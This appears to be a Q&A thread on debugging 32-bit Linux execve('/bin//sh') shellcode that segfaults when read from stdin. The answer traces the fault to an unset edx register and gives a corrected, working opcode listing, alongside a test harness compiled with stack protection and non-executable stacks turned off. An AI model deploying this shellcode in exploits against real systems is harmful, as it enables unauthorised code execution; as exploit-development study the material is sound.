  "content": "I am working on a basic shellcode that will spawn a shell after getting called in a 32-bit program.\nHere is the shellcode i'm using:\n\n```\nxor    %eax,%eax  \npush   %eax  \npush   $0x68732f2f  \npush   $0x6e69622f  \nmov    %esp,%ebx  \npush   %eax  \npush   %ebx  \nmov    %esp,%ecx  \nmov    $0xb,%al  \nint    $0x80  \n\n```\n(Source: http://shell-storm.org/shellcode/files/shellcode-827.php)\n\nI am successfully using this shellcode when i hardcode it inside the exploited program:\n\n```\nchar *shellcode = \"\\x31[...]x80\";  \nint main(void)  \n{  \n    (*(void(*)()) shellcode)();  \n    return 0;  \n}  \n\n```\nBut when i try to read the shellcode from the standard input, i get a segmentation fault instead. This is the program used:\n\n```\n#include [...]\ntypedef void (*func)(void);\nint main(void)\n{\n    char input[4096];\n    read(0, input, 4096);\n    ((func)&input)();\n    return 0;\n}\n\n```\nWhen i debug this program with gdb, i can see that everything goes as planned until this instruction:\n\n```\nint    $0x80\n\n```\nWhere the program doesn't do anything and continue to the next instruction like nothing happened, which make the program crash.\n\nAt first i thought this was because i didn't disabled some execution prevention, but i'm compiling with the following flags:\n\n```\ngcc shell.c -o shell -fno-stack-protector -m32 -z execstack\n\n```\nI could really use help on it, I've been stuck on it all day.\n\n",

      "content": "With the shellcode given I was not able to get a shell. If you strace the binary when getting input from the stack\n\n```\nexecve(\"/bin//sh\", [\"/bin//sh\"], [/* 0 vars */]) = -1 EFAULT (Bad address)\n\n```\nchar *const envp[] is passed in edx register which is not properly set. To patch this I changed shellcode to this\n\n```\n 0:    31 c0                    xor    eax, eax\n 2:    50                       push   eax\n 3:    68 2f 2f 73 68           push   0x68732f2f\n 8:    68 2f 62 69 6e           push   0x6e69622f\n d:    89 e3                    mov    ebx, esp\n f:    50                       push   eax\n10:    53                       push   ebx\n11:    89 e1                    mov    ecx, esp\n13:    b0 0b                    mov    al, 0xb\n15:    31 d2                    xor    edx, edx\n17:    cd 80                    int    0x80\n\n```\nThis will zero edx and the execve will run successfully.\n\n```\nexecve(\"/bin//sh\", [\"/bin//sh\"], NULL)  = 0\n\n```\nIn case where you stored shellcode while compiling, I think it was luck that edx pointed to an address which was 0.\n\n",

In case it helps, here is the full output from strace: pastebin.com/Mt3uhSzf   I don't get much info from gdb, i just see that he can't access an adress after executing bin/dash.
